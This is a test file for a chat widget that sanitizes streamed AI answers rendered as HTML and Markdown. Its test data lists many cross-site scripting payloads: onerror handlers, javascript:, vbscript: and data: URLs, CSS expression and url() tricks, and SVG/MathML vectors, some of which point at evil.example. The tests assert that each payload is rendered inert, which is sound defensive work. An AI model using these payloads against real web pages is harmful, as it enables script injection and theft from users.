    // The final render of a fence or a backtick never closed is unchanged.
    assert.equal(renderWidget("use `<img src=/x>", 2000, PLATFORM, strict, SESSION), `<p>use \`<img src="${strict ? PLATFORM : ""}/x"></p>`);
  }
});

// Answers whose last characters change what their first ones meant: a quote
// or a tag that ends, a fence or a backtick that closes.
const STREAMED_ANSWERS = [
  `Look: <img src=/api/v1/chat/files/${FILE_ID}/download> and <img src=https://cdn.example/a.png alt=a> end`,
  "<a href=https://example.com/docs/page>docs</a> then <img src=/assets/logo.png width=40>\nnext",
  "<table background=/bg.png><tr><td>x</td></tr></table>",
  '<p style="background:url(/s.png)">styled</p>',
  `see <img alt="<b>" src=/api/v1/chat/files/${FILE_ID}> done`,
  '<img alt="<img src=/tracker>" src=/partial/full.png>',
  '<b title="<img src=/x>">bold</b> and <b title="<img src=/y>" data>more</b>',
  // A tag whose ">" has arrived is never cut in two by one it holds.
  `<img alt="<b title='" ![](/api/v1/chat/files/${FILE_ID}) src=/x>`,
  "<img alt=\"<b title='\" src=/a<b> tail",
  `see <a href="![x](/api/v1/chat/files/${FILE_ID})">file</a>`,
  `<b title=![a](/api/v1/chat/files/${FILE_ID}) x="">b</b> <b title='![a](/api/v1/chat/files/${FILE_ID})'>c</b>`,
  "see <b **x** title=\"<img alt='\">' src=/api/partial/rest.png>bold</b>",
  "<textarea><b title='</textarea><img alt=\"' >\" src=/api/x/full.png></textarea>",
  "<svg><b title='</svg><img alt=\"' >\" src=/api/x/full.png></svg>",
  "<noscript><!--</noscript><img src=/api/n/full.png> <title><!--</title><img src=https://cdn.example/t.png>",
  "<!-- <img src=/c1> --> <img src=/c2.png>",
  'Snippet:\n```html\n<img src="https://cdn.example/a.png">\n```\ndone',
  "```js\nconst a = `<img src=/y>`;\n```",
  'Add `<img src="logo.png">` to the page.',
  `To show it write \`![c](/api/v1/chat/files/${FILE_ID})\` in the answer.`,
  // The backtick a tag holds pairs with a later one: its ">" becomes code.
  "<img alt=`a src=/api/cut/full.png> and `b`",
  // md() drops what ended a tag (the text after a table row's last "|", a
  // quote marker): the sanitizer reads it on to a later ">".
  "| <img alt='x | y'>\n|---|\nmore text ' src=/partial/full.png> end",
  "| <img alt='x | y'\n|---|\n> z ' src=/partial/full.png> end",
  "| <img alt='x | y'>\n|---|\n```\n' src=/partial/full.png\n```\ndone",
];

test("widget: no frame of a streamed answer loads what its final render does not", () => {
  const answers = [
    ...STREAMED_ANSWERS,
    ...WIDGET_UNCHANGED.map(([input]) => input),
    ...RESTORED.map(([input]) => input),
    ...PAYLOADS,
  ];
  for (const strict of [false, true]) {
    for (const answer of answers) {
      const final = new Set(loadedUrls(renderWidget(answer, 2000, PLATFORM, strict, SESSION)));
      for (let end = 1; end <= answer.length; end++) {
        const prefix = answer.slice(0, end);
        const html = renderFrame(prefix, strict);
        assertInert(html, prefix, strict);
        for (const url of loadedUrls(html)) {
          assert.ok(final.has(url), `prefix ${end} of ${JSON.stringify(answer)} loads ${url} (strict=${strict})`);
        }
      }
    }
  }
});

test("widget: a streamed frame of a complete answer renders exactly as the final render", () => {
  const complete = [
    ...[...WIDGET_UNCHANGED, ...RESTORED, ...SCRIPT_VECTORS].map(([input]) => input),
    // Answers whose tags overlap however much: every "<" is read from itself.
    "<a ".repeat(2000) + ">done",
    '<a b="x" '.repeat(20_000) + ">",
    // Long ones: the whole frame is read.
    `<img src="/api/v1/chat/files/${FILE_ID}" alt="c">${"\n".repeat(20_000)}done`,
    `<b>${"line\n".repeat(5_000)}</b>`,
    "| <img alt='x | y'>\n|---|\nmore text ' src=/partial/full.png> end",
  ];
  for (const strict of [false, true]) {
    for (const input of complete) {
      assert.equal(renderFrame(input, strict), renderWidget(input, 2000, PLATFORM, strict, SESSION), input.slice(0, 200));
    }
  }
  // The final render is untouched, stray tags included.
  assert.equal(renderWidget("if a<b, it's **sorted**. Here's why."), "<p>if asorted</strong>. Here's why.</p>");
});

test("widget: streamed frames stay inert and linear", () => {
  // Every "<" of a frame is read from itself: a run of tags nested in quoted
  // values would be read again from each one.
  const nested: Array<[string, string]> = [
    ["tags nested in quoted values", '<a b="x" '.repeat(20_000) + ">"],
    // The whole frame is read, whatever its length.
    ["a tag still being streamed before a long tail", "<img src=/partial" + "\n".repeat(200_000)],
    ["tags still being streamed, one per line", "<img src=/p\n".repeat(20_000)],
    ["a long answer of complete tags", "<p>a <b>b</b> <i>c</i></p>\n".repeat(10_000)],
  ];
  for (const strict of [false, true]) {
    for (const payload of PAYLOADS) assertInertWhileStreaming((text) => renderFrame(text, strict), payload);
    for (const [label, input] of [...RESCAN_CASES, ...nested]) {
      assertInert(renderWidget(input, 1000, PLATFORM, strict, SESSION, true), label);
    }
  }
});

test("widget: a streamed frame finds where each tag ends exactly as tagEnd does", () => {
  const tagEnd = WIDGET_CORE.tagEnd as (s: string, from: number) => number;
  const tagEnds = WIDGET_CORE.tagEnds as (s: string, first: number) => ArrayLike<number>;
  const maxTag = WIDGET_CORE.MAX_TAG_LENGTH as number;
  const check = (s: string, first: number, froms?: number[]) => {
    const ends = tagEnds(s, first);
    for (const from of froms ?? Array.from({ length: s.length - first + 1 }, (_, k) => first + k)) {
      const end = ends[from - first];
      assert.equal(end >= 0 && end - from < maxTag ? end : -1, tagEnd(s, from), `${JSON.stringify(s.slice(0, 60))} from ${from}`);
    }
  };
  // Every order of the characters tagEnd tells apart, from every position
  // (seeded: the same strings on every run).
  const alphabet = ["<", ">", '"', "'", "=", "/", " ", "\t", "a"];
  let seed = 4601;
  const random = (n: number) => {
    seed ^= seed << 13;
    seed ^= seed >>> 17;
    seed ^= seed << 5;
    return (seed >>> 0) % n;
  };
  for (let n = 0; n < 5000; n++) {
    const s = Array.from({ length: 1 + random(24) }, () => alphabet[random(alphabet.length)]).join("");
    check(s, random(s.length + 1));
  }
  // A tag whose ">" lands just inside its bound, on it, or just past it, and
  // one whose quoted value runs up to it, or never closes.
  for (const d of [maxTag - 1, maxTag, maxTag + 1]) {
    for (const s of [`<a${" ".repeat(d)}>`, `<a b="${"x".repeat(d - 5)}">`, `<a b="${"x".repeat(d - 5)}`]) {
      check(s, 0, [0, 1, 2, 3, s.length - 2, s.length - 1, s.length]);
    }
  }
});

test("widget: code keeps a platform address as text", () => {
  const address = `/api/v1/chat/files/${FILE_ID}`;
  assert.equal(renderInSession(`\`![x](${address})\``), `<p><code>![x](${address})</code></p>`);
  assert.equal(renderInSession(`\`\`\`\n![x](${address})\n\`\`\``), `<pre><code>![x](${address})</code></pre>`);
});

test("widget: the alt text of a session image stays text however it is written", () => {
  assert.equal(
    renderInSession(`![a "b" <c> & **d**](/api/v1/chat/files/${FILE_ID})`),
    `<p><img src="${SESSION}/files/${FILE_ID}" alt="a &quot;b&quot; &lt;c&gt; & **d**" class="fc-img"></p>`,
  );
  // A generation prompt may run over several lines and carry brackets.
  assert.equal(
    renderInSession(`![a fox\nin  [watercolour]](/api/v1/chat/files/${FILE_ID})`),
    `<p>${sessionImg("files", FILE_ID, "a fox in [watercolour]")}</p>`,
  );
  // A linked image keeps its link.
  assert.equal(
    renderInSession(`[![chart](/api/v1/chat/files/${FILE_ID})](https://example.com/report)`),
    `<p><a href="https://example.com/report" ${NEW_TAB}>${sessionImg("files", FILE_ID, "chart")}</a></p>`,
  );
});

// Aimed at the session image grammar: the address in odd spellings, and the
// alt text and the attributes around it carrying markup.
const SESSION_IMAGE_PAYLOADS = [
  `![x](/api/v1/chat/files/${FILE_ID}" onerror="alert(1))`,
  `![x" onerror="alert(1)](/api/v1/chat/files/${FILE_ID})`,
  `![<img src=x onerror=alert(1)>](/api/v1/chat/files/${FILE_ID})`,
  `<img src="/api/v1/chat/files/${FILE_ID}" onerror="alert(1)" style="x:y">`,
  `<img src="/api/v1/chat/files/${FILE_ID}/download"/onerror=alert(1)>`,
  `<img src=/api/v1/chat/images/${IMAGE_ID} onerror=alert(1)>`,
  `![x](/api/v1/chat/files/${FILE_ID})<script>alert(1)</script>`,
  `![x](javascript:alert(1)//api/v1/chat/files/${FILE_ID})`,
  `<img src="&#x2F;api/v1/chat/files/${FILE_ID}" alt="encoded">`,
  `<img src=" /api/v1/chat/files/${FILE_ID}\n" alt="spaced">`,
];

test("widget: a hostile answer stays inert with session images, streamed and final, in both modes", () => {
  for (const strict of [false, true]) {
    const render = (text: string) => renderInSession(text, strict);
    for (const payload of [...PAYLOADS, ...SESSION_IMAGE_PAYLOADS]) assertInertWhileStreaming(render, payload);
  }
  // The address the browser would read is the one mapped; nothing else survives.
  assert.equal(
    renderInSession(`<img src="&#x2F;api/v1/chat/files/${FILE_ID}" alt="encoded" onerror="alert(1)">`),
    `<p>${sessionImg("files", FILE_ID, "encoded")}</p>`,
  );
});

test("widget: in strict rendering every link opens a new tab, whatever the answer wrote", () => {
  assert.equal(renderStrict('<a href="https://ok.example">x</a>'), `<p><a href="https://ok.example" ${NEW_TAB}>x</a></p>`);
  assert.equal(
    renderStrict('<a href="https://ok.example" target="_self" rel="opener">x</a>'),
    `<p><a href="https://ok.example" ${NEW_TAB}>x</a></p>`,
  );
  assert.equal(renderStrict("[x](https://ok.example)"), `<p><a href="https://ok.example" ${NEW_TAB}>x</a></p>`);
  // The scheme allow-list still applies.
  assert.equal(renderStrict('<a href="javascript:alert(1)">x</a>'), `<p><a ${NEW_TAB}>x</a></p>`);
});

test("widget: by default an HTML link keeps the target it was written with", () => {
  // No target: it opens in the page, as it always did.
  assert.equal(renderWidget('<a href="https://ok.example">x</a>'), '<p><a href="https://ok.example">x</a></p>');
  // A new tab gets no handle on the host page and no referrer.
  assert.equal(
    renderWidget('<a href="https://ok.example" target="_blank" rel="opener">x</a>'),
    `<p><a href="https://ok.example" target="_blank" rel="noopener noreferrer">x</a></p>`,
  );
  // Any other target is dropped.
  assert.equal(
    renderWidget('<a href="https://ok.example" target="_top" rel="nofollow">x</a>'),
    '<p><a href="https://ok.example" rel="nofollow">x</a></p>',
  );
  // Markdown links have always opened a new tab.
  assert.equal(renderWidget("[x](https://ok.example)"), `<p><a href="https://ok.example" ${NEW_TAB}>x</a></p>`);
  assert.equal(renderWidget('<a href="javascript:alert(1)">x</a>'), "<p><a>x</a></p>");
});

test("widget: a streamed answer is painted once per frame and ends on the exact final text", () => {
  const answer =
    "## Summary\n\nSee [the docs](https://docs.example.com) and <img src=\"/api/v1/files/1\" alt=\"chart\">.\n\n" +
    "- one\n- **two**\n\n| a | b |\n|---|---|\n| 1 | 2 |\n\n```js\nconst a = '<div>';\n```\n";
  const chunks = answer.match(/[\s\S]{1,7}/g) ?? [];
  let frames: Array<() => void> = [];
  let requested = 0;
  let cancelled = 0;
  let accumulated = "";
  const painted: string[] = [];
  const paint = frameScheduler(
    (callback) => {
      frames.push(callback);
      return ++requested;
    },
    () => {
      cancelled++;
      frames = [];
    },
    () => painted.push(renderWidget(accumulated, 2000, PLATFORM)),
  );
  const runFrames = () => {
    const due = frames;
    frames = [];
    for (const callback of due) callback();
  };
  let framesRun = 0;
  chunks.forEach((chunk, index) => {
    accumulated += chunk;
    paint.schedule();
    if (index % 5 === 4) {
      runFrames();
      framesRun++;
    }
  });
  // Several chunks share a frame: never more than one paint per frame.
  assert.ok(requested <= framesRun + 1 && painted.length <= framesRun, `${painted.length} paints for ${framesRun} frames`);
  assert.ok(painted.length < chunks.length);
  // The end of the stream cancels the frame still due and paints the final text itself.
  paint.cancel();
  const final = renderWidget(accumulated, 2000, PLATFORM);
  runFrames();
  assert.equal(accumulated, answer);
  assert.equal(final, renderWidget(answer, 2000, PLATFORM));
  assert.ok(cancelled <= 1 && frames.length === 0);
  assert.equal(painted.length, framesRun, "a cancelled frame painted after the final text");
});

test("widget: strict rendering comes from the public config, before any answer is rendered", () => {
  assert.match(WIDGET_SOURCE, /var STRICT_RENDERING = false;/);
  assert.match(
    WIDGET_SOURCE,
    /agentConfig = await apiGet\("\/chat\/" \+ TOKEN \+ "\/config"\);\s*STRICT_RENDERING = agentConfig\.strict_rendering === true;/,
  );
  // The arguments may hold one call of their own: the session route.
  const calls = [...WIDGET_SOURCE.matchAll(/renderAssistant\(((?:[^()]|\([^()]*\))*)\)/g)].map(([, args]) => args);
  const sinks = calls.filter((args) => /accumulatedContent|m\.content/.test(args));
  assert.ok(sinks.length >= 3, `expected the three answer sinks, found ${sinks.length}`);
  for (const args of sinks) assert.match(args, /, PLATFORM_ROOT, STRICT_RENDERING, sessionRoute\(\)(?:, true)?$/);
  // Only a frame of the streamed bubble is rendered as streaming text.
  assert.equal(sinks.filter((args) => args.endsWith(", true")).length, 1);
});

test("widget: the stream schedules its paints and the final paint cancels the pending one", () => {
  assert.match(WIDGET_SOURCE, /evt\.type === "stream"[\s\S]*?streamPaint\.schedule\(\);\s*\} else if/);
  assert.match(
    WIDGET_SOURCE,
    /streamPaint\.cancel\(\);\s*streamingEl\.className = "fc-msg assistant";\s*paintAnswer\(streamingEl, renderAssistant\(accumulatedContent, PLATFORM_ROOT, STRICT_RENDERING, sessionRoute\(\)\)\);/,
  );
  // Every paint of the streamed bubble keeps the session images it shows.
  assert.match(
    WIDGET_SOURCE,
    /if \(!streamingEl\) return;\s*paintAnswer\(streamingEl, renderAssistant\(accumulatedContent, PLATFORM_ROOT, STRICT_RENDERING, sessionRoute\(\), true\)\);/,
  );
  assert.match(WIDGET_SOURCE, /box\.querySelectorAll\("img\.fc-img"\)\.forEach\(function \(img\) \{\s*var same = kept\[img\.getAttribute\("src"\)\];\s*if \(same && same\.length\) img\.replaceWith\(same\.shift\(\)\);/);
});

test("widget: a session image is sized to its bubble, and no other image is restyled", () => {
  assert.match(WIDGET_SOURCE, /\.fc-msg\.assistant img\.fc-img \{[^}]*max-width: 100%;/);
  assert.doesNotMatch(WIDGET_SOURCE, /\.fc-msg\.assistant img[\s,{]/);
});

// Every render of a streamed answer is a full re-render, so a renderer that is
// super-linear on some input freezes the page for as long as that answer
// streams. These are the shapes that used to be: runs of brackets (the link
// grammar, both renderers) and tags that cannot end (the widget's tag scan).
const RESCAN_CASES: Array<[string, string]> = [
  ["a run of '['", "[".repeat(200_000)],
  ["a run of '[a]('", "[a](".repeat(50_000)],
  ["a run of '<a' with no end", "<a".repeat(95_000) + "/" + "x".repeat(9_000)],
  ["a run of '<a '", "<a ".repeat(66_000)],
  ["a run of \"<a '>'\"", "<a '>'".repeat(33_000)],
  // A drawing's open elements are matched at each end tag.
  ["a drawing nested 100,000 deep", "<svg>" + "<g>".repeat(100_000)],
  ["end tags a drawing never opened", "<svg>" + "<g>".repeat(64) + "</x>".repeat(100_000)],
  ["a MathML token full of tags", "<math><mi>" + "<mrow>".repeat(100_000)],
];

test("the widget stays linear on inputs built to be rescanned", () => {
  // A linear render of these takes milliseconds; a rescanning one takes seconds.
  for (const [label, input] of RESCAN_CASES) assertInert(renderWidget(input, 1000), label);
});

// Session images add a scan of their own (the Markdown image grammar): the
// same shapes, built around it.
const SESSION_RESCAN_CASES: Array<[string, string]> = [
  ["a run of '!['", "![".repeat(200_000)],
  ["a run of '![a]('", "![a](".repeat(50_000)],
  ["a run of '![['", "![[".repeat(100_000)],
  ["a run of '![[]'", "![[]".repeat(60_000)],
  ["a run of unfinished session addresses", "![a](/api/v1/chat/files/".repeat(10_000)],
  ["an alt text that never closes", "![" + "a".repeat(300_000)],
];

test("widget: session images keep the renderer linear on inputs built to be rescanned", () => {
  for (const [label, input] of SESSION_RESCAN_CASES) {
    for (const strict of [false, true]) assertInert(renderWidget(input, 1000, PLATFORM, strict, SESSION), label);
  }
});

// What the widget renders for ordinary answers; its Markdown links carry
// "noreferrer", as the main chat's do. The HTML case is an agent whose output format is
// `html` (the widget has always rendered such answers as markup).
const WIDGET_UNCHANGED: Array<[string, string]> = [
  ["Hello **world** and *you*.", "<p>Hello <strong>world</strong> and <em>you</em>.</p>"],
  ["~~old~~ new", "<p><del>old</del> new</p>"],
  ["# Title\n## Sub\n### Third", "<h1>Title</h1><h2>Sub</h2><h3>Third</h3>"],
  ["- one\n- two\n- **three**", "<ul><li>one</li><li>two</li><li><strong>three</strong></li></ul>"],
  ["1. first\n2. second", "<ol><li>first</li><li>second</li></ol>"],
  ["> quoted line\n> second line", "<blockquote>quoted line<br>second line</blockquote>"],
  [
    "| Col A | Col B |\n|---|---|\n| 1 | **2** |",
    "<table><thead><tr><th>Col A</th><th>Col B</th></tr></thead><tbody><tr><td>1</td><td><strong>2</strong></td></tr></tbody></table>",
  ],
  ["```js\nconst a = '<div>' && b;\n```", "<pre><code>const a = '&lt;div&gt;' &amp;&amp; b;</code></pre>"],
  ["Use `npm install` then `<tag>`.", "<p>Use <code>npm install</code> then <code>&lt;tag&gt;</code>.</p>"],
  [
    "See [the docs](https://docs.example.com/a?b=1&c=2) now.",
    '<p>See <a href="https://docs.example.com/a?b=1&c=2" target="_blank" rel="noopener noreferrer">the docs</a> now.</p>',
  ],
  [
    "Visit https://example.com/path?x=1&y=2 today.",
    '<p>Visit <a href="https://example.com/path?x=1&y=2" target="_blank" rel="noopener noreferrer">https://example.com/path?x=1&y=2</a> today.</p>',
  ],
  ["Line one\nLine two", "<p>Line one<br>Line two</p>"],
  ["Intro\n\n---\n\nOutro", "<p>Intro</p><hr><p>Outro</p>"],
  [
    "Mail [us](mailto:team@example.com) or call [support](tel:+33123456789).",
    '<p>Mail <a href="mailto:team@example.com" target="_blank" rel="noopener noreferrer">us</a> or call <a href="tel:+33123456789" target="_blank" rel="noopener noreferrer">support</a>.</p>',
  ],
  [
    "Relative [link](/docs/page#anchor) and [anchor](#top).",
    '<p>Relative <a href="/docs/page#anchor" target="_blank" rel="noopener noreferrer">link</a> and <a href="#top" target="_blank" rel="noopener noreferrer">anchor</a>.</p>',
  ],
  ['R&D costs &copy; 2026 "quoted" it\'s fine', '<p>R&D costs &copy; 2026 "quoted" it\'s fine</p>'],
  [
    "[**bold link**](https://example.com)",
    '<p><a href="https://example.com" target="_blank" rel="noopener noreferrer"><strong>bold link</strong></a></p>',
  ],
  ["**https://example.com**", "<p><strong>https://example.com</strong></p>"],
  [
    "[https://example.com](https://example.com)",
    '<p><a href="https://example.com" target="_blank" rel="noopener noreferrer">https://example.com</a></p>',
  ],
  [
    "[filter](https://api.example.com/items?filter[status]=open) and [local](http://[::1]:8080/)",
    '<p><a href="https://api.example.com/items?filter[status]=open" target="_blank" rel="noopener noreferrer">filter</a> and <a href="http://[::1]:8080/" target="_blank" rel="noopener noreferrer">local</a></p>',
  ],
  [
    "Caf\u00e9 \u2615 \u65e5\u672c\u8a9e \u0627\u0644\u0639\u0631\u0628\u064a\u0629 \ud83d\ude80 **gras**",
    "<p>Caf\u00e9 \u2615 \u65e5\u672c\u8a9e \u0627\u0644\u0639\u0631\u0628\u064a\u0629 \ud83d\ude80 <strong>gras</strong></p>",
  ],
  [
    '<h2>Summary</h2>\n<p>Activity <strong>rose</strong> in <em>Q3</em>, see <a href="https://opencti.example/dashboard">the dashboard</a>.</p>\n<ul>\n<li>one</li>\n<li>two</li>\n</ul>',
    '<p><h2>Summary</h2><br><p>Activity <strong>rose</strong> in <em>Q3</em>, see <a href="https://opencti.example/dashboard">the dashboard</a>.</p><br><ul><br><li>one</li><br><li>two</li><br></ul></p>',
  ],
];

test("widget: ordinary answers render as before", () => {
  for (const [input, expected] of WIDGET_UNCHANGED) assert.equal(renderWidget(input), expected);
});

test("widget: a stray angle bracket in prose still reads as one", () => {
  // Written as a character reference now, displayed as the same character.
  assert.equal(renderWidget("a < b and c > d"), "<p>a &lt; b and c &gt; d</p>");
});

const CHART =
  '<svg width="120" height="40" viewBox="0 0 120 40" role="img" aria-label="Chart">\n' +
  "  <defs>\n" +
  '    <linearGradient id="g"><stop offset="0" stop-color="#0fbcff"/><stop offset="1" stop-color="#001bda"/></linearGradient>\n' +
  '    <marker id="arrow" markerWidth="6" markerHeight="6" refX="3" refY="3" orient="auto"><path d="M0,0 L6,3 L0,6 z"/></marker>\n' +
  "  </defs>\n" +
  '  <rect x="0" y="0" width="80" height="40" rx="4" fill="url(#g)"/>\n' +
  '  <line x1="80" y1="20" x2="115" y2="20" stroke="#333" stroke-width="2" marker-end="url(#arrow)"/>\n' +
  '  <text x="40" y="25" text-anchor="middle" style="font-size:12px;fill:#fff">Q3</text>\n' +
  "</svg>\n\nThe arrow is the trend.";

// What the widget rendered before its allow-list and runs no script: inline
// styles, presentational markup, links of any scheme but the script ones, and
// SVG / MathML drawings. Default rendering keeps them; strict rendering drops
// them exactly as it always has. [answer, default render, strict render].
const RESTORED: Array<[string, string, string]> = [
  [
    '<p style="color:#c00;text-align:center">Alert</p>',
    '<p><p style="color:#c00;text-align:center">Alert</p></p>',
    "<p><p>Alert</p></p>",
  ],
  [
    '<table border="1" cellpadding="4" cellspacing="0" style="border-collapse:collapse"><tr><th bgcolor="#eeeeee" align="left">Host</th></tr><tr><td valign="top" nowrap width="50%">dc01</td></tr></table>',
    '<p><table border="1" cellpadding="4" cellspacing="0" style="border-collapse:collapse"><tr><th bgcolor="#eeeeee" align="left">Host</th></tr><tr><td valign="top" nowrap="" width="50%">dc01</td></tr></table></p>',
    "<p><table><tr><th>Host</th></tr><tr><td>dc01</td></tr></table></p>",
  ],
  [
    '<font color="red" face="Arial" size="2">Warning</font> <center>Centred</center> <big>big</big> <tt>tt</tt>',
    '<p><font color="red" face="Arial" size="2">Warning</font> <center>Centred</center> <big>big</big> <tt>tt</tt></p>',
    "<p>Warning Centred big tt</p>",
  ],
  [
    '<p dir="rtl" lang="ar">\u0645\u0631\u062d\u0628\u0627</p><div hidden>h</div><details open><summary>More</summary>Details</details>',
    '<p><p dir="rtl" lang="ar">\u0645\u0631\u062d\u0628\u0627</p><div hidden="">h</div><details open=""><summary>More</summary>Details</details></p>',
    "<p><p>\u0645\u0631\u062d\u0628\u0627</p><div>h</div><details><summary>More</summary>Details</details></p>",
  ],
  [
    '<ol type="a" start="3" reversed><li value="5">item</li></ol><hr size="2" noshade><br clear="all">',
    '<p><ol type="a" start="3" reversed=""><li value="5">item</li></ol><hr size="2" noshade=""><br clear="all"></p>',
    '<p><ol start="3"><li>item</li></ol><hr><br></p>',
  ],
  [
    '<img src="https://cdn.example/logo.png" alt="logo" align="right" border="0" hspace="8" style="max-width:100%">',
    '<p><img src="https://cdn.example/logo.png" alt="logo" align="right" border="0" hspace="8" style="max-width:100%"></p>',
    `<p><a href="https://cdn.example/logo.png" ${NEW_TAB}>logo</a></p>`,
  ],
  [
    '<table background="/assets/bg.png"><tr><td style="background:url(//cdn.example/bg.png) no-repeat">x</td></tr></table>',
    '<p><table background="/assets/bg.png"><tr><td style="background:url(//cdn.example/bg.png) no-repeat">x</td></tr></table></p>',
    "<p><table><tr><td>x</td></tr></table></p>",
  ],
  [
    '<p style="font-family:&quot;Segoe UI&quot;,sans-serif;overscroll-behavior:contain">Text</p>',
    '<p><p style="font-family:&quot;Segoe UI&quot;,sans-serif;overscroll-behavior:contain">Text</p></p>',
    "<p><p>Text</p></p>",
  ],
  [
    '<p style="--gap:4px;margin:var(--gap)">x</p>',
    '<p><p style="--gap:4px;margin:var(--gap)">x</p></p>',
    "<p><p>x</p></p>",
  ],
  [
    '<a href="msteams:/l/chat/0/0?users=alice@example.com">Teams</a> <a href="slack://open?team=T123" target="_blank">Slack</a>',
    `<p><a href="msteams:/l/chat/0/0?users=alice@example.com">Teams</a> <a href="slack://open?team=T123" ${NEW_TAB}>Slack</a></p>`,
    `<p><a ${NEW_TAB}>Teams</a> <a ${NEW_TAB}>Slack</a></p>`,
  ],
  [
    "Call [Alice](sip:alice@example.com), text [support](sms:+33123456789) or subscribe to [the calendar](webcal://calendar.example/team.ics).",
    `<p>Call <a href="sip:alice@example.com" ${NEW_TAB}>Alice</a>, text <a href="sms:+33123456789" ${NEW_TAB}>support</a> or subscribe to <a href="webcal://calendar.example/team.ics" ${NEW_TAB}>the calendar</a>.</p>`,
    `<p>Call <a ${NEW_TAB}>Alice</a>, text <a ${NEW_TAB}>support</a> or subscribe to <a ${NEW_TAB}>the calendar</a>.</p>`,
  ],
  [
    '<blockquote cite="urn:isbn:0451450523">Quoted</blockquote> <a href="ftp://files.example/report.pdf">report</a>',
    '<p><blockquote cite="urn:isbn:0451450523">Quoted</blockquote> <a href="ftp://files.example/report.pdf">report</a></p>',
    `<p><blockquote>Quoted</blockquote> <a ${NEW_TAB}>report</a></p>`,
  ],
  [
    // The line breaks the Markdown pass writes between a drawing's lines are
    // its newlines again, so a drawing written over several lines stays whole.
    CHART,
    '<p><svg width="120" height="40" viewbox="0 0 120 40" role="img" aria-label="Chart">\n' +
      "  <defs>\n" +
      '    <lineargradient id="g"><stop offset="0" stop-color="#0fbcff"/><stop offset="1" stop-color="#001bda"/></lineargradient>\n' +
      '    <marker id="arrow" markerwidth="6" markerheight="6" refx="3" refy="3" orient="auto"><path d="M0,0 L6,3 L0,6 z"/></marker>\n' +
      "  </defs>\n" +
      '  <rect x="0" y="0" width="80" height="40" rx="4" fill="url(#g)"/>\n' +
      '  <line x1="80" y1="20" x2="115" y2="20" stroke="#333" stroke-width="2" marker-end="url(#arrow)"/>\n' +
      '  <text x="40" y="25" text-anchor="middle" style="font-size:12px;fill:#fff">Q3</text>\n' +
      "</svg></p><p>The arrow is the trend.</p>",
    "<p></p><p>The arrow is the trend.</p>",
  ],
  [
    '<math display="block"><mrow><msup><mi>x</mi><mn>2</mn></msup><mo>+</mo><mfrac><mi>a</mi><mn>2</mn></mfrac></mrow></math>',
    '<p><math display="block"><mrow><msup><mi>x</mi><mn>2</mn></msup><mo>+</mo><mfrac><mi>a</mi><mn>2</mn></mfrac></mrow></math></p>',
    "<p></p>",
  ],
  [
    // An HTML tag ends a drawing left open, as it does in the browser.
    "Use <svg> here.\n\nNext paragraph.",
    "<p>Use <svg> here.</svg></p><p>Next paragraph.</p>",
    "<p>Use ",
  ],
];

test("widget: by default an answer keeps the styles, markup, links and drawings it always showed", () => {
  for (const [input, expected] of RESTORED) assert.equal(renderWidget(input), expected, input);
});

test("widget: strict rendering still drops them, exactly as before", () => {
  for (const [input, , expected] of RESTORED) assert.equal(renderStrict(input), expected, input);
});

// Script stays out whatever the answer wrote, and nothing in a drawing links
// out or loads anything from outside it. [answer, default render]; the strict
// render holds none of it either.
const SCRIPT_VECTORS: Array<[string, string]> = [
  ['<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">x</a>', "<p><a>x</a></p>"],
  ['<a href=" JaVaScRiPt:alert(1)">x</a> <a href="vbscript:msgbox(1)">y</a>', "<p><a>x</a> <a>y</a></p>"],
  ['<img src="data:image/svg+xml;base64,PHN2Zz48L3N2Zz4=" alt="inline">', '<p><img alt="inline"></p>'],
  ['<table background="javascript:alert(1)"><tr><td>x</td></tr></table>', "<p><table><tr><td>x</td></tr></table></p>"],
  ['<p style="background:url(javascript:alert(1))">a</p>', "<p><p>a</p></p>"],
  ['<p style="width:expression(alert(1))">b</p>', "<p><p>b</p></p>"],
  ['<p style="behavior:url(#default#time2)">c</p>', "<p><p>c</p></p>"],
  ['<p style="-moz-binding:url(//evil.example/x.xml#y)">d</p>', "<p><p>d</p></p>"],
  ['<p style="background:url(java\\73 cript:alert(1))">e</p>', "<p><p>e</p></p>"],
  ['<p style="background:url(&#106;avascript:alert(1))">f</p>', "<p><p>f</p></p>"],
  ['<p style="background:u&bsol;72l(javascript:alert(1))">g</p>', "<p><p>g</p></p>"],
  ['<p style="width:expr/**/ession(alert(1))">h</p>', "<p><p>h</p></p>"],
  ['<font color="red" onmouseover="alert(1)">i</font>', '<p><font color="red">i</font></p>'],
  ['<svg onload="alert(1)"><rect width="1" height="1" onclick="alert(1)"/></svg>', '<p><svg><rect width="1" height="1"/></svg></p>'],
  ['<svg><script>alert(1)</script><circle r="1"/></svg>', '<p><svg><circle r="1"/></svg></p>'],
  // A link ends the drawing: it stays an HTML link, under the URL policy.
  ['<svg><a href="//ok.example"><text>link</text></a></svg>', '<p><svg></svg><a href="//ok.example">link</a></p>'],
  [
    '<svg><animate attributeName="href" values="javascript:alert(1)"/><set attributeName="onmouseover" to="alert(1)"/><rect/></svg>',
    "<p><svg><rect/></svg></p>",
  ],
  [
    '<svg><use href="//evil.example/x.svg#a"/><image href="//evil.example/x.png"/><feImage href="//evil.example/y.png"/></svg>',
    "<p><svg></svg></p>",
  ],
  [
    '<svg><foreignObject><img src="x" onerror="alert(1)"></foreignObject><desc><b>d</b></desc><title>t</title><rect/></svg>',
    "<p><svg><rect/></svg></p>",
  ],
  [
    '<svg><rect fill="url(//evil.example/p.svg#x)" stroke="red"/><rect style="fill:u\\72l(//evil.example/p.svg#x)"/><rect fill="url(&#x23;g)"/></svg>',
    '<p><svg><rect stroke="red"/><rect/><rect fill="url(&#x23;g)"/></svg></p>',
  ],
  ['<svg><style>rect{fill:url(//evil.example/x)}</style><rect/></svg>', "<p><svg><rect/></svg></p>"],
  // Nor does a drawing inherit a reference from the HTML around it.
  [
    '<div style="--u:url(//evil.example/p.svg#x)"><svg><rect style="fill:var(--u)"/></svg></div>',
    '<p><div><svg><rect style="fill:var(--u)"/></svg></div></p>',
  ],
  ['<div style="color:#333;fill:url(//evil.example/p.svg#x)"><svg><rect/></svg></div>', "<p><div><svg><rect/></svg></div></p>"],
  [
    '<div style="clip-path:url(//evil.example/c.svg#c)"><svg style="clip-path:inherit"><rect fill="inherit" style="all:inherit"/></svg></div>',
    '<p><div style="clip-path:url(//evil.example/c.svg#c)"><svg><rect/></svg></div></p>',
  ],
  [
    '<math href="javascript:alert(1)"><mi xlink:href="javascript:alert(1)">x</mi><maction actiontype="statusline"><mi>y</mi></maction><mglyph src="//evil.example/x.png"/></math>',
    "<p><math><mi>x</mi><mi>y</mi></math></p>",
  ],
